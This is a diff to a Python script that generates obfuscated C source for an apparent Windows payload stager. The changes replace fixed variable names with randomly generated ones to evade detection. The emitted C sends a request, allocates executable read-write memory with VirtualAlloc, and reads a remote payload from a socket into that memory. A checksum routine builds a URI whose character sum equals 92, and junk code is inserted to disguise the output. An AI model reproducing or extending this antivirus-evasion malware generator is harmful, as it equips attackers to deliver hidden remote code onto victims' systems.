@@ -69,9 +69,15 @@ RandCharset = varname_creator()
 
 RandInteger = varname_creator()
 
+RandRecv_int = varname_creator()
+
 ChecksumFunction = varname_creator()
 
 RandCharPtr2 = varname_creator()
+
+RandFuncFlag1 = varname_creator()
+
+RandFuncFlag2 = varname_creator()
 
 Charset = ''.join(sample("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789",62))
 
@@ -93,17 +99,17 @@ fake_func2 += "}\n"
 
 def_func1 = ""
 def_func1 += "int " + SumValueFunc + "(char " + RandCharArray + "[]) {\n"
-def_func1 += "int " + RandInteger + "=0; int i;for (i=0; i<strlen(" + RandCharArray + ");++i) " + RandInteger + " += " + RandCharArray + "[i];\n"
+def_func1 += "int " + RandInteger + "=0; int " + RandFuncFlag1 + ";for (" + RandFuncFlag1 + "=0; " + RandFuncFlag1 + "<strlen(" + RandCharArray + ");++" + RandFuncFlag1 + ") " + RandInteger + " += " + RandCharArray + "[" + RandFuncFlag1 + "];\n"
 def_func1+= "return (" + RandInteger + " % 256);}\n"
 
 
 def_func2 = ""
 def_func2 += "char* " + ChecksumFunction + "(){\n"
-def_func2 += "srand (time(NULL));int i;char " + RandCharset + "[] = \"" + Charset + "\";\n"
+def_func2 += "srand (time(NULL));int " + RandFuncFlag2 + ";char " + RandCharset + "[] = \"" + Charset + "\";\n"
 def_func2 += "char* " + RandCharPtr2 + " = malloc(5); " + RandCharPtr2 + "[4] = 0;\n"
 def_func2 += "while (TRUE){\n"
-def_func2 += "for(i=0;i<3;++i){" + RandCharPtr2 + "[i] = " + RandCharset + "[rand() % (sizeof(" + RandCharset + ")-1)];}\n"
-def_func2 += "for(i=0;i<sizeof(" + RandCharset + ");i++){ " + RandCharPtr2 + "[3] = " + RandCharset + "[i];\n"
+def_func2 += "for(" + RandFuncFlag2 + "=0;" + RandFuncFlag2 + "<3;++" + RandFuncFlag2 + "){" + RandCharPtr2 + "[" + RandFuncFlag2 + "] = " + RandCharset + "[rand() % (sizeof(" + RandCharset + ")-1)];}\n"
+def_func2 += "for(" + RandFuncFlag2 + "=0;" + RandFuncFlag2 + "<sizeof(" + RandCharset + ");" + RandFuncFlag2 + "++){ " + RandCharPtr2 + "[3] = " + RandCharset + "[" + RandFuncFlag2 + "];\n"
 def_func2 += "if (" + SumValueFunc + "(" + RandCharPtr2 + ") == 92) return " + RandCharPtr2 + "; } } return 0;}\n"
 
 
@@ -202,10 +208,10 @@ Hollow_code += "send(" + RandSocket + "," + Randbuff + ", strlen( " + Randbuff +
 Hollow_code += "Sleep(300);\n"
 Hollow_code += "" + Randpointer1 + " = VirtualAlloc(0, 1000000, MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n"
 Hollow_code += "char * " + Randpointer2 + " = " + Randpointer1 + ";\n"
-Hollow_code += "int RecvInt;\n"
-Hollow_code += "do {RecvInt = recv(" + RandSocket + ", " + Randpointer2 + ", 1024, 0);\n"
-Hollow_code += "" + Randpointer2 + " += RecvInt;\n"
-Hollow_code += "}while ( RecvInt > 0 );\n"
+Hollow_code += "int " + RandRecv_int + ";\n"
+Hollow_code += "do {" + RandRecv_int + " = recv(" + RandSocket + ", " + Randpointer2 + ", 1024, 0);\n"
+Hollow_code += "" + Randpointer2 + " += " + RandRecv_int + ";\n"
+Hollow_code += "}while ( " + RandRecv_int + " > 0 );\n"
 Hollow_code += Junkcode_18
 Hollow_code += "closesocket(" + RandSocket + "); WSACleanup();\n"
 Hollow_code += Junkcode_19
